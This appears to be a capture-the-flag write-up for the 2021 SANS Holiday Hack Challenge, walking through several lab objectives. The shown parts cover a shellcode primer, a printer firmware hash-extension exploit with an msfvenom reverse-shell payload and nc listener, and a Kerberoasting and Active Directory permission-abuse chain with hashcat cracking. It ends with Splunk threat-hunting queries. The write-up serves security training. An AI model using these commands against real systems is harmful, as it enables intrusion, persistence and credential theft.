~/.bash_profile and ~/.bashrc is updated to ensure that the ~/.config/sudo/ path takes precedence over any other configured paths. The last part of the Ducky Script reverses a string, Base64 decodes it, executes the decoded instructions via bash , and erases any shell history evidence by running history -c and deleting the .bash_history file. Manually reversing and Base64 decoding the string yields an echo statement which copies the SSH key for user ickymcgoop@trollfun.jackfrosttower.com into the ~/.ssh/authorized_keys file, enabling easy SSH access to the host. Answer ickymcgoop","title":"Solution"},{"location":"objectives/o6/","text":"Shellcode Primer \u2693\ufe0e Difficulty : Direct link : tracer website Terminal hint : Holiday Hero Objective \u2693\ufe0e Request Complete the Shellcode Primer in Jack's office. According to the last challenge, what is the secret to KringleCon success? \"All of our speakers and organizers, providing the gift of ____, free to the community.\" Talk to Chimney Scissorsticks in the NetWars area for hints. Ruby Cyster Hey, I'm Ruby Cyster. Don't listen to anything my sister, Ingreta, says about me. So I'm looking at this system, and it has me a little bit worried. If I didn't know better, I'd say someone here is learning how to hack North Pole systems. Who's got that kind of nerve! Anyway, I hear some elf on the other roof knows a bit about this type of thing. Hints \u2693\ufe0e Shellcode Primer Primer If you run into any shellcode primers at the North Pole, be sure to read the directions and the comments in the shellcode source! Debugging Shellcode Also, troubleshooting shellcode can be difficult. Use the debugger step-by-step feature to watch values. Register Stomping Lastly, be careful not to overwrite any register values you need to reference later on in your shellcode. Solution \u2693\ufe0e Solving this challenge is simply a matter of following the instructions to progress through each of the 11 tutorial sections. The last step, writing shellcode which reads /var/northpolesecrets.txt and prints the contents to stdout , provides the answer. To keep the page length to a minimum, all but the final solution are collapsed by default. 1. Introduction 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 ; Set up some registers (sorta like variables) with values ; In the debugger, look how these change! mov rax, 0 mov rbx, 1 mov rcx, 2 mov rdx, 3 mov rsi, 4 mov rdi, 5 mov rbp, 6 ; Push and pop - watch how the stack changes! push 0x12345678 pop rax push 0x1111 push 0x2222 push 0x3333 pop rax pop rax pop rax ; This creates a string and references it in rax - watch the debugger! call getstring db \"Hello World!\",0 getstring: pop rax ; Finally, return 0x1337 mov rax, 0x1337 ret 2. Loops 1 2 3 4 5 6 7 8 9 10 11 12 13 ; We want to loop 5 times - you can change this if you want! mov rax, 5 ; Top of the loop top: ; Decrement rax dec rax ; Jump back to the top until rax is zero jnz top ; Cleanly return after the loop ret 3. Getting Started 1 2 3 4 5 ; This is a comment! We'll use comments to help guide your journey. ; Right now, we just need to RETurn! ; ; Enter a return statement below and hit Execute to see what happens! ret 4. Returning a Value 1 2 3 4 5 ; TODO: Set rax to 1337 mov rax, 1337 ; Return, just like we did last time ret 5. System Calls 1 2 3 4 5 6 7 8 ; TODO: Find the syscall number for sys_exit and put it in rax mov rax, 60 ; sys_exit is syscal 60 ; TODO: Put the exit_code we want (99) in rdi mov rdi, 99 ; Perform the actual syscall syscall 6. Calling the Void 1 2 3 4 5 ; Push this value to the stack push 0x12345678 ; Try to return ret 7. Getting RIP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ; Remember, this call pushes the return address to the stack call place_below_the_nop ; This is where the function *thinks* it is supposed to return nop ; This is a 'label' - as far as the call knows, this is the start of a function place_below_the_nop: ; TODO: Pop the top of the stack into rax pop rax ; Return from our code, as in previous levels ret 8. Hello, World! 1 2 3 4 5 6 7 8 9 10 11 12 13 ; This would be a good place for a call call get_address ; This is the literal string 'Hello World', null terminated, as code. Except ; it'll crash if it actually tries to run, so we'd better jump over it! db 'Hello World',0 ; This would be a good place for a label and a pop get_address: pop rax ; This would be a good place for a re... oh wait, it's already here. Hooray! ret 9. Hello World!! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ; TODO: Get a reference to this string into the correct register call print_helloworld ; push the address of the string to the stack db 'Hello World!',0 ; Jump over the string to this label print_helloworld: ; Set up a call to sys_write ; TODO: Set rax to the correct syscall number for sys_write mov rax, 1 ; sys_write is syscall 1 ; TODO: Set rdi to the first argument (the file descriptor, 1) mov rdi, 1 ; TODO: Set rsi to the second argument (buf - this is the \"Hello World\" string) pop rsi ; pop the string address from the stack into rsi ; TODO: Set rdx to the third argument (length of the string, in bytes) mov rdx, 12 ; Perform the syscall syscall ; Return cleanly ret 10. Opening a File 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ; TODO: Get a reference to this string into the correct register call open_file ; push the address of the string to the stack db '/etc/passwd',0 ; Jump over the string to this label open_file: ; Set up a call to sys_open ; TODO: Set rax to the correct syscall number mov rax, 2 ; sys_open is syscall 2 ; TODO: Set rdi to the first argument (the filename) pop rdi ; pop the string address from the stack into rdi ; TODO: Set rsi to the second argument (flags - 0 is fine) mov rsi, 0 ; TODO: Set rdx to the third argument (mode - 0 is also fine) mov rdx, 0 ; Perform the syscall syscall ; syscall sets rax to the file handle, so to return the file handle we don't ; need to do anything else! ret 11. Reading a File 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 ; TODO: Get a reference to this call read_file ; push the address of the string to the stack db '/var/northpolesecrets.txt',0 ; Jump over the string to this label read_file: ; TODO: Call sys_open pop rdi ; pop the string address from the stack into rdi mov rax, 2 ; sys_open is syscall 2 mov rsi, 0 ; set rsi to 0 mov rdx, 0 ; set rdx to 0 syscall ; TODO: Call sys_read on the file handle and read it into rsp mov rdi, rax ; set rdi to the file handle which is now in rax mov rax, 0 ; sys_read is syscall 0 mov rsi, rsp ; use rsp for the buffer mov rdx, 1024 ; read 1024 bytes syscall ; TODO: Call sys_write to write the contents from rsp to stdout (1) mov rdx, rax ; set rdx to the number of actual bytes read by sys_read mov rax, 1 ; sys_write is syscall 1 mov rdi, 1 ; set rdi to file descriptor 1 or stdout mov rsi, rsp ; use rsp for the buffer syscall ; TODO: Call sys_exit mov rax, 60 ; sys_exit is syscall 60 mov rdi, 0 ; exit code syscall Answer cyber security knowledge","title":"Shellcode Primer"},{"location":"objectives/o6/#shellcode-primer","text":"Difficulty : Direct link : tracer website Terminal hint : Holiday Hero","title":"Shellcode Primer"},{"location":"objectives/o6/#objective","text":"Request Complete the Shellcode Primer in Jack's office. According to the last challenge, what is the secret to KringleCon success? \"All of our speakers and organizers, providing the gift of ____, free to the community.\" Talk to Chimney Scissorsticks in the NetWars area for hints. Ruby Cyster Hey, I'm Ruby Cyster. Don't listen to anything my sister, Ingreta, says about me. So I'm looking at this system, and it has me a little bit worried. If I didn't know better, I'd say someone here is learning how to hack North Pole systems. Who's got that kind of nerve! Anyway, I hear some elf on the other roof knows a bit about this type of thing.","title":"Objective"},{"location":"objectives/o6/#hints","text":"Shellcode Primer Primer If you run into any shellcode primers at the North Pole, be sure to read the directions and the comments in the shellcode source! Debugging Shellcode Also, troubleshooting shellcode can be difficult. Use the debugger step-by-step feature to watch values. Register Stomping Lastly, be careful not to overwrite any register values you need to reference later on in your shellcode.","title":"Hints"},{"location":"objectives/o6/#solution","text":"Solving this challenge is simply a matter of following the instructions to progress through each of the 11 tutorial sections. The last step, writing shellcode which reads /var/northpolesecrets.txt and prints the contents to stdout , provides the answer. To keep the page length to a minimum, all but the final solution are collapsed by default. 1. Introduction 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 ; Set up some registers (sorta like variables) with values ; In the debugger, look how these change! mov rax, 0 mov rbx, 1 mov rcx, 2 mov rdx, 3 mov rsi, 4 mov rdi, 5 mov rbp, 6 ; Push and pop - watch how the stack changes! push 0x12345678 pop rax push 0x1111 push 0x2222 push 0x3333 pop rax pop rax pop rax ; This creates a string and references it in rax - watch the debugger! call getstring db \"Hello World!\",0 getstring: pop rax ; Finally, return 0x1337 mov rax, 0x1337 ret 2. Loops 1 2 3 4 5 6 7 8 9 10 11 12 13 ; We want to loop 5 times - you can change this if you want! mov rax, 5 ; Top of the loop top: ; Decrement rax dec rax ; Jump back to the top until rax is zero jnz top ; Cleanly return after the loop ret 3. Getting Started 1 2 3 4 5 ; This is a comment! We'll use comments to help guide your journey. ; Right now, we just need to RETurn! ; ; Enter a return statement below and hit Execute to see what happens! ret 4. Returning a Value 1 2 3 4 5 ; TODO: Set rax to 1337 mov rax, 1337 ; Return, just like we did last time ret 5. System Calls 1 2 3 4 5 6 7 8 ; TODO: Find the syscall number for sys_exit and put it in rax mov rax, 60 ; sys_exit is syscal 60 ; TODO: Put the exit_code we want (99) in rdi mov rdi, 99 ; Perform the actual syscall syscall 6. Calling the Void 1 2 3 4 5 ; Push this value to the stack push 0x12345678 ; Try to return ret 7. Getting RIP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ; Remember, this call pushes the return address to the stack call place_below_the_nop ; This is where the function *thinks* it is supposed to return nop ; This is a 'label' - as far as the call knows, this is the start of a function place_below_the_nop: ; TODO: Pop the top of the stack into rax pop rax ; Return from our code, as in previous levels ret 8. Hello, World! 1 2 3 4 5 6 7 8 9 10 11 12 13 ; This would be a good place for a call call get_address ; This is the literal string 'Hello World', null terminated, as code. Except ; it'll crash if it actually tries to run, so we'd better jump over it! db 'Hello World',0 ; This would be a good place for a label and a pop get_address: pop rax ; This would be a good place for a re... oh wait, it's already here. Hooray! ret 9. Hello World!! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ; TODO: Get a reference to this string into the correct register call print_helloworld ; push the address of the string to the stack db 'Hello World!',0 ; Jump over the string to this label print_helloworld: ; Set up a call to sys_write ; TODO: Set rax to the correct syscall number for sys_write mov rax, 1 ; sys_write is syscall 1 ; TODO: Set rdi to the first argument (the file descriptor, 1) mov rdi, 1 ; TODO: Set rsi to the second argument (buf - this is the \"Hello World\" string) pop rsi ; pop the string address from the stack into rsi ; TODO: Set rdx to the third argument (length of the string, in bytes) mov rdx, 12 ; Perform the syscall syscall ; Return cleanly ret 10. Opening a File 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ; TODO: Get a reference to this string into the correct register call open_file ; push the address of the string to the stack db '/etc/passwd',0 ; Jump over the string to this label open_file: ; Set up a call to sys_open ; TODO: Set rax to the correct syscall number mov rax, 2 ; sys_open is syscall 2 ; TODO: Set rdi to the first argument (the filename) pop rdi ; pop the string address from the stack into rdi ; TODO: Set rsi to the second argument (flags - 0 is fine) mov rsi, 0 ; TODO: Set rdx to the third argument (mode - 0 is also fine) mov rdx, 0 ; Perform the syscall syscall ; syscall sets rax to the file handle, so to return the file handle we don't ; need to do anything else! ret 11. Reading a File 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 ; TODO: Get a reference to this call read_file ; push the address of the string to the stack db '/var/northpolesecrets.txt',0 ; Jump over the string to this label read_file: ; TODO: Call sys_open pop rdi ; pop the string address from the stack into rdi mov rax, 2 ; sys_open is syscall 2 mov rsi, 0 ; set rsi to 0 mov rdx, 0 ; set rdx to 0 syscall ; TODO: Call sys_read on the file handle and read it into rsp mov rdi, rax ; set rdi to the file handle which is now in rax mov rax, 0 ; sys_read is syscall 0 mov rsi, rsp ; use rsp for the buffer mov rdx, 1024 ; read 1024 bytes syscall ; TODO: Call sys_write to write the contents from rsp to stdout (1) mov rdx, rax ; set rdx to the number of actual bytes read by sys_read mov rax, 1 ; sys_write is syscall 1 mov rdi, 1 ; set rdi to file descriptor 1 or stdout mov rsi, rsp ; use rsp for the buffer syscall ; TODO: Call sys_exit mov rax, 60 ; sys_exit is syscall 60 mov rdi, 0 ; exit code syscall Answer cyber security knowledge","title":"Solution"},{"location":"objectives/o7/","text":"Printer Exploitation \u2693\ufe0e Difficulty : Direct link : printer website Terminal hint : - Objective \u2693\ufe0e Request Investigate the stolen Kringle Castle printer . Get shell access to read the contents of /var/spool/printer.log . What is the name of the last file printed (with a .xlsx extension)? Find Ruby Cyster in Jack's office for help with this objective. Ruby Cyster So first things first, you should definitely take a look at the firmware. With that in-hand, you can pick it apart and see what's there. Did you know that if you append multiple files of that type, the last one is processed? Have you heard of Hash Extension Attacks ? If something isn't working, be sure to check the output! The error messages are very verbose. Everything else accomplished, you just might be able to get shell access to that dusty old thing! Hints \u2693\ufe0e Dropping Files Files placed in /app/lib/public/incoming will be accessible under https://printer.kringlecastle.com/incoming/ . Hash Extension Attacks Hash Extension Attacks can be super handy when there's some type of validation to be circumvented. Printer Firmware When analyzing a device, it's always a good idea to pick apart the firmware. Sometimes these things come down Base64-encoded. Solution \u2693\ufe0e Reverse the firmware \u2693\ufe0e We first need to understand what a firmware file looks like. So, download the current firmware from the printer website , copy out the data in the JSON file's firmware field, Base64 decode the data, and save it to its own firmware-export.bin file (line 1). The file command tells us we're working with a ZIP file (line 2). Unpacking the archive reveals a firmware.bin executable (lines 3-4). Parsing JSON data in the command line jq is a handy command line JSON processor. You can use it to slice, filter, and transform structured JSON data with the same ease that tools like sed , awk , and grep let you manipulate text. jq isn't a requirement for this challenge, but it helps to turn the whole extraction process into an easy-to-use one-liner. Extracting the firmware 1 2 3 4 5 cat firmware-export.json | jq -r '.firmware' | base64 -D > firmware-export.bin file firmware-export.bin # indicates this is a ZIP file mv firmware-export.bin firmware-export.zip # rename for clarity unzip firmware-export.zip # unpack archive file firmware.bin # indicates this is a 64-bit ELF binary To create a valid firmware file we simply reverse the steps described above. Create an executable called firmware.bin , compress the file, and copy the Base64 encoded archive data to the firmware field in the JSON file. The last step is to add a valid signature to the JSON file, but unfortunately we're missing the necessary secret key to calculate that value. Ensuring signature validation \u2693\ufe0e When uploading a firmware file, the printer will validate the uploaded signature by calculating a new signature value using a secret key only it knows. If the calculated signature matches the value in the uploaded JSON file, the firmware is considered valid and the printer will execute the enclosed firmware.bin file. If the signature is invalid, we get the following error. Building a new firmware file means we also need a new signature, but how do we do that without the secret key? That question is answererd by the Hash Extension Attacks hint, which also provides a handy Hash Extender tool to automate the attack! blog.skullsecurity.org An application is susceptible to a hash length extension attack if it prepends a secret value to a string, hashes it with a vulnerable algorithm, and entrusts the attacker with both the string and the hash, but not the secret. Then, the server relies on the secret to decide whether or not the data returned later is the same as the original data. It turns out, Even though the attacker doesn't know the value of the prepended secret, he can still generate a valid hash for {secret || data || attacker_controlled_data} ! This is done by simply picking up where the hashing algorithm left off; it turns out, 100% of the state needed to continue a hash is in the output of most hashing algorithms! We simply load that state into the appropriate hash structure and continue hashing. Since we're appending our payload to valid firmware data in order to execute the Hash Extension attack, we also don't need to worry about which of the 2 ZIP archives will be unpacked. Ruby Cister notes that \"if you append multiple files of that type, the last one is processed\" , which ensures our firmware.bin will be extracted and executed by the printer after successful validation. Creating the payload \u2693\ufe0e For the payload we can keep it simple by using a shell script or binary that copies /var/spool/printer.log to /app/lib/public/incoming/ , making it accessible from https://printer.kringlecastle.com/incoming/ . Name the payload firmware.bin , make it executable using chmod +x firmware.bin , and compress the file using zip payload-script.zip firmware.bin . We now have the original firmware-export.zip we extracted previously and our own payload-script.zip , which we both use as input for Hash Extender to create the final combined payload and valid signature. Compiling Hash Extender The Hash Extender C code first needs to be compiled into a binary before we can use it. Clone the Hash Extender repository , change into the hash_extender directory using cd hash_extender , and finally run make to compile the project into a single hash_extender binary. The xxd command will create a hex dump of our payload-script.zip file and xargs will then take that data and make it available to hash_extender as append_data . As an alternative to these commands you could also update the source code to support an --append-file parameter that takes a filename as input instead of the raw data. Using --output-data-format fancy | head -n -3 | tail -n +5 | xxd -r | base64 we can extract the hex data from the output, convert it to binary, and Base64 encode it. Putting it all together \u2693\ufe0e Use the new signature and Base64 data from the previous step to create a new firmware-payload-script.json file and upload it to the printer. Once the upload finishes the printer will validate the JSON, decode the enclosed Base64 data, validate the signature, unpack the last archive which contains our payload, and execute our firmware.bin shell script which copies /var/spool/printer.log to /app/lib/public/incoming/crahan_printer.log . We can now download the printer log file from https://printer.kringlecastle.com/incoming/crahan_printer_new.log . Answer Troll_Pay_Chart.xlsx Reverse shell The example above uses a very simple payload to copy the file we need to a location we can access it from, but you can also solve this challenge by using a reverse shell as the payload. Only the payload creation part is different. All other steps remain exactly the same as outlined above. Create a simple reverse TCP shell payload using MSFvenom by running msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=9085 -f elf > firmware.bin . Next, set up a listener using nc -lvp 9085 that will accept the incoming reverse shell connection. Finally, upload the new firmware file and watch the connection be established. In /app/lib/app.rb you'll find the mybigsigningkey! secret key which is used by the printer to validate the firmware signature. In /var/spool/ there's a birdknob.png picture of a... bird on a doorknob, and you can also leave a note on the host for other players to find.","title":"Printer Exploitation"},{"location":"objectives/o7/#printer-exploitation","text":"Difficulty : Direct link : printer website Terminal hint : -","title":"Printer Exploitation"},{"location":"objectives/o7/#objective","text":"Request Investigate the stolen Kringle Castle printer . Get shell access to read the contents of /var/spool/printer.log . What is the name of the last file printed (with a .xlsx extension)? Find Ruby Cyster in Jack's office for help with this objective. Ruby Cyster So first things first, you should definitely take a look at the firmware. With that in-hand, you can pick it apart and see what's there. Did you know that if you append multiple files of that type, the last one is processed? Have you heard of Hash Extension Attacks ? If something isn't working, be sure to check the output! The error messages are very verbose. Everything else accomplished, you just might be able to get shell access to that dusty old thing!","title":"Objective"},{"location":"objectives/o7/#hints","text":"Dropping Files Files placed in /app/lib/public/incoming will be accessible under https://printer.kringlecastle.com/incoming/ . Hash Extension Attacks Hash Extension Attacks can be super handy when there's some type of validation to be circumvented. Printer Firmware When analyzing a device, it's always a good idea to pick apart the firmware. Sometimes these things come down Base64-encoded.","title":"Hints"},{"location":"objectives/o7/#solution","text":"","title":"Solution"},{"location":"objectives/o8/","text":"Kerberoasting on an Open Fire \u2693\ufe0e Difficulty : Direct link : elfu website Terminal hint : HoHo... No Objective \u2693\ufe0e Request Obtain the secret sleigh research document from the Elf University domain controller. What is the first secret ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season? Start by registering as a student on the ElfU Portal . Find Eve Snowshoes in Santa's office for hints. Hints \u2693\ufe0e Active Directory Interrogation Investigating Active Directory errors is harder without Bloodhound , but there are native methods . Stored Credentials Administrators often store credentials in scripts. These can be coopted by an attacker for other purposes! CeWL for Wordlist Creation CeWL can generate some great wordlists from website, but it will ignore digits in terms by default. Hashcat Mangling Rules OneRuleToRuleThemAll.rule is great for mangling when a password dictionary isn't enough. Kerberoasting and Hashcat Syntax Learn about Kerberoasting to leverage domain credentials to get usernames and crackable hashes for service accounts. Kerberoast and AD Abuse Talk Check out Chris Davis' talk and scripts on Kerberoasting and Active Directory permissions abuse. Solution \u2693\ufe0e While there's quite a few steps required to solve this callenge, most of it follows the example given by Chris Davis in his KringleCon talk , with some reconnaissance and enumeration at the start to find the domain controller and the file server. Solution summary Breaking out of the grading application Information gathering and host enumeration Kerberoasting the elfu.local/elfu_svc service account Retrieving the remote_elf stored credentials from the elfu_svc_shr share Adding our account to the Research Department domain group Download the research document from the research_dep share Breaking out of the grading application \u2693\ufe0e Register for an account on the ElfU Portal website and log in via SSH to grades.elfu.org . We can break out of the Python grading application and start a Bash shell by first pressing Ctrl + d , followed by executing import os; os.system('/bin/bash') . Permanently change the login shell to /bin/bash using chsh to prevent having to go through all of this again at the next login. Information gathering and host enumeration \u2693\ufe0e Preinstalled tools The Linux host already provides a lot of useful tools like powershell , nmap , smbclient , and some scripts from the Impacket toolkit. If any additional tools or scripts are needed beyond the ones already present, copy them over using scp -P 2222 <filename> <username>@grades.elfu.org: . First order of business is to enumerate, enumerate, enumerate ! We need gather as much network and host information as possible to better understand what the environment looks like. ifconfig tells us our IP address is 172.17.0.2, so run an nmap ping scan against the /24 subnet using nmap -sn 172.17.0.0/24 to see what hosts in our immediate vicinity respond back. Including our own host, 5 devices are up and running with IP addresses ranging from 172.17.0.1 to 172.17.0.5. Next, perform a port scan against all hosts with nmap 172.17.0.1-5 and save the scan results for future reference. The volume and types of open ports on host 172.17.0.3 are definitely interesting. Copy enum4linux.pl to the host and run ./enum4linux.pl 172.17.0.3 to gather even more details like file share information, which can also be viewed using smbclient -L 172.17.0.3 . While definitely interesting, host 172.17.0.3 is not the domain controller and any kerberoasting attacks against it will fail. To find the domain controller ping the elfu.local domain assigned to our host, which returns a response from 10.128.1.53 or hhc21-windows-dc.c.holidayhack2021.internal . The windows-dc part of the hostname is a good indicator this is the DC. Kerberoasting service accounts and hash cracking \u2693\ufe0e With the domain controller found, we can start following Chris Davis' KringleCon talk . Impacket's GetUserSPNs.py script is already available in /usr/local/bin , so run GetUserSPNs.py -outputfile spns.txt -dc-ip 10.128.1.53 elfu.local/bvofqrjnps against the domain controller in order to grab some service account hashes. Replace bvofqrjnps with your own account name. The spns.txt file now contains a single hash for the elfu.local/elfu_svc service account which we can crack using hashcat . As cracking passwords is resource intensive, we'll use the hint about CeWL to generate a custom wordlist based on the content from the ElfU Portal website, which contains a few interesting words inside an HTML comment block. Generate the wordlist using cewl --with-numbers https://register.elfu.org/register > elfu_pwlist.txt . Together with the OneRuleToRuleThemAll.rule mangling rules files, we can now run hashcat -m 13100 -r OneRuleToRuleThemAll.rule spns.txt elfu_pwlist.txt which reveals that the elfu.local/elfu_svc service account's password is Snow2021! . Retrieving stored credentials from scripts \u2693\ufe0e The elfu.local/elfu_svc service account credentials now allow us to log in to the elfu_svc_shr file share on 172.17.0.3, using smbclient //172.17.0.3/elfu_svc_shr -U elfu.local/elfu_svc . Download all the PowerShell scripts with mget * . One of the hints notes that \"Administrators often store credentials in scripts. These can be coopted by an attacker for other purposes!\" . Searching through all files with grep -i elfu *.ps1 reveals a GetProcessInfo.ps1 script that contains a PowerShell credentials object for an elfu.local\\remote_elf account. Intead of retrieving a process list from the domain controller using Invoke-Command , we can reuse the $aCred credentials object to open a remote PowerShell session to the host. Adding our account to the right domain group \u2693\ufe0e We finally made it onto the domain controller! Similar to the Frost Tower Website Checkup challenge though, we might be tempted to try and go for domain admin, but the goal is to find a secret sleigh research document. We already know there's a research_dep file share which might hold what we're looking for and a search for domain group names containing research reveals there is a Research Department group as well. Fun fact, our detailed information for host 172.17.0.3 already contained this information. Using one of Chris Davis' PowerShell snippets to read the Discretionary Access Control List (DACL) of the Research Department domain group tells us that the elfu.local\\remote_elf user, which we're logged in as, has WriteDACL permissions on that group. List DACL permissions 1 2 $ADSI = [ADSI] \"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local\" $ADSI . psbase . ObjectSecurity . GetAccessRules ( $true , $true , [Security.Principal.NTAccount] ) Having writeDACL permissions means we can now give our elfu.local\\bvofqrjnps domain user GenericAll permission on the Research Department domain group and then use those additional permissions to add our account to that group. To do this we can use two more code snippets provided by Chris, making sure to replace $ldapConnString , $username , $password , and the domain name in $IdentityReference and $user with the proper values. Grant permission to bvofqrjnps Add bvofqrjnps to Research Department A final check with Get-ADPrincipalGroupMembership bvofqrjnps | select name confirms our account was added! Downloading the research document \u2693\ufe0e It might take a few minutes for the changes we made to propagate from the domain controller to host 172.17.0.3. But after some time we're able to use smbclient //172.17.0.3/research_dep -U elfu.local/bvofqrjnps to connect to the research_dep file share and retrieve the secret sleigh research document ! The first secret ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season is Kindness . Answer Kindness","title":"Kerberoasting on an Open Fire"},{"location":"objectives/o8/#kerberoasting-on-an-open-fire","text":"Difficulty : Direct link : elfu website Terminal hint : HoHo... No","title":"Kerberoasting on an Open Fire"},{"location":"objectives/o8/#objective","text":"Request Obtain the secret sleigh research document from the Elf University domain controller. What is the first secret ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season? Start by registering as a student on the ElfU Portal . Find Eve Snowshoes in Santa's office for hints.","title":"Objective"},{"location":"objectives/o8/#hints","text":"Active Directory Interrogation Investigating Active Directory errors is harder without Bloodhound , but there are native methods . Stored Credentials Administrators often store credentials in scripts. These can be coopted by an attacker for other purposes! CeWL for Wordlist Creation CeWL can generate some great wordlists from website, but it will ignore digits in terms by default. Hashcat Mangling Rules OneRuleToRuleThemAll.rule is great for mangling when a password dictionary isn't enough. Kerberoasting and Hashcat Syntax Learn about Kerberoasting to leverage domain credentials to get usernames and crackable hashes for service accounts. Kerberoast and AD Abuse Talk Check out Chris Davis' talk and scripts on Kerberoasting and Active Directory permissions abuse.","title":"Hints"},{"location":"objectives/o8/#solution","text":"While there's quite a few steps required to solve this callenge, most of it follows the example given by Chris Davis in his KringleCon talk , with some reconnaissance and enumeration at the start to find the domain controller and the file server. Solution summary Breaking out of the grading application Information gathering and host enumeration Kerberoasting the elfu.local/elfu_svc service account Retrieving the remote_elf stored credentials from the elfu_svc_shr share Adding our account to the Research Department domain group Download the research document from the research_dep share","title":"Solution"},{"location":"objectives/o9/","text":"Splunk! \u2693\ufe0e Difficulty : Direct link : splunk website Terminal hint : Yara Analysis Objective \u2693\ufe0e Request Help Angel Candysalt solve the Splunk challenge in Santa's great hall. Fitzy Shortstack is in Santa's lobby, and he knows a few things about Splunk. What does Santa call you when when you complete the analysis? Angel Candysalt Greetings North Pole visitor! I'm Angel Candysalt! A euphemism? No, that's my name. Why do people ask me that? Anywho, I'm back at Santa's Splunk terminal again this year. There's always more to learn! Take a look and see what you can find this year. With who-knows-what going on next door, it never hurts to have sharp SIEM skills! Hints \u2693\ufe0e GitHub Monitoring in Splunk Between GitHub audit log and webhook event recording, you can monitor all activity in a repository, including common git commands such as git add , git status , and git commit . Sysmon Monitoring in Splunk Sysmon network events don't reveal the process parent ID for example. Fortunately, we can pivot with a query to investigate process creation events once you get a process ID. Malicious NetCat?? Did you know there are multiple versions of the Netcat command that can be used maliciously? nc.openbsd , for example. Solution \u2693\ufe0e Task 1 \u2693\ufe0e Question Capture the commands Eddie ran most often, starting with git. Looking only at his process launches as reported by Sysmon, record the most common git-related CommandLine that Eddie seemed to use. If you ignore the docker ps top result, the 4th sample Splunk search we're provided pretty much answers this question. To narrow down the results to just git-related command lines however, we can either use the Image or the CommandLine field (line 3). Splunk search query 1 2 3 4 5 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational | where EventCode=1 and user=\"eddie\" | where Image like \"%git%\" | stats count by Image CommandLine | sort - count Answer git status Task 2 \u2693\ufe0e Question Looking through the git commands Eddie ran, determine the remote repository that he configured as the origin for the 'partnerapi' repo. The correct one! This question expands on the previous search query. We search for Sysmon Event ID 1 process creation events, but this time filter not only on binary names that match git but also require the command line to contain partnerapi (line 3). Inverting the sort order by using - _time puts the most recent and correct git remote add command at the top. Splunk search query 1 2 3 4 5 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational | where EventCode=1 and user=\"eddie\" | where Image like \"%git%\" and CommandLine like \"%partnerapi%\" | sort - _time | table _time CommandLine Answer git@github.com:elfnp3/partnerapi.git Task 3 \u2693\ufe0e Question The 'partnerapi' project that Eddie worked on uses Docker. Gather the full docker command line that Eddie used to start the 'partnerapi' project on his workstation. Once again we can reuse much of the Splunk query we've been working with so far. Instead of looking for git commands however, we now pivot to docker commands (line 3). Sorting by process execution time returns an ordered timeline which tells us that the first docker command run after any activity related to partnerapi is docker compose up . Splunk search query 1 2 3 4 5 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational | where EventCode=1 and user=\"eddie\" | where Image like \"%docker%\" or CommandLine like \"%partnerapi%\" | sort _time | table _time CommandLine Answer docker compose up Task 4 \u2693\ufe0e Question Eddie had been testing automated static application security testing (SAST) in GitHub. Vulnerability reports have been coming into Splunk in JSON format via GitHub webhooks. Search all the events in the main index in Splunk and use the sourcetype field to locate these reports. Determine the URL of the vulnerable GitHub repository that the elves cloned for testing and document it here. You will need to search outside of Splunk (try GitHub) for the original name of the repository. To answer this question we need to pivot to the github_json source type. Use the fields in the left sidebar to find a suitable candidate like repository.html_url . Clicking the field name will pop up a dialog containing all possible values. We already know about https://github.com/elfnp3/partnerapi , so we focus on the https://github.com/elfnp3/dvws-node repository which, upon closer inspection, appears to have been cloned from https://github.com/snoopysecurity/dvws-node . Answer https://github.com/snoopysecurity/dvws-node Task 5 \u2693\ufe0e Question Santa asked Eddie to add a JavaScript library from NPM to the 'partnerapi' project. Determine the name of the library and record it here for our workshop documentation. Back to Sysmon Event ID 1 process creation events we go! Searching for any command lines containing git commit or npm install (line 3) returns a timeline of relevant process activity, neatly sorted from oldest to newest. The log message in the final command provides the library name we're looking for, holiday-utils-js . Splunk search query 1 2 3 4 5 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational | where EventCode=1 and user=\"eddie\" | search CommandLine IN (\"*git commit*\", \"*npm install*\") | sort _time | table _time CommandLine Answer holiday-utils-js Task 6 \u2693\ufe0e Question Another elf started gathering a baseline of the network activity that Eddie generated. Start with their search and capture the full process_name field of anything that looks suspicious. We switch from Sysmon Event ID 1 process creation events to Sysmon Event ID 3 network events. The only thing we have to change in the provided query is the final line and count by process_name instead of dest_ip and dest_port (line 5). Splunk search query 1 2 3 4 5 index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational | where EventCode=3 and user=\"eddie\" | where NOT dest_ip like (\"127.0.0.%\") | where NOT dest_port IN (22,53,80,443) | stats count by process_name Would you look at that! If it isn't the reverse shell's best buddy, netcat ! Answer /usr/bin/nc.openbsd Task 7 \u2693\ufe0e Question Uh oh. This documentation exercise just turned into an investigation. Starting with the process identified in the previous task, look for additional suspicious commands launched by the same parent process. One thing to know about these Sysmon events is that Network connection events don't indicate the parent process ID, but Process creation events do! Determine the number of files that were accessed by a related process and record it here. Now that we've identified suspicious activity we can expand our Splunk searches to all users and confirm this isn't happening on any other hosts. We start by searching for /usr/bin/nc.openbsd process details (line 3) and print the parent process ID. Splunk search query 1 2 3 4 index=main sourcetype=journald 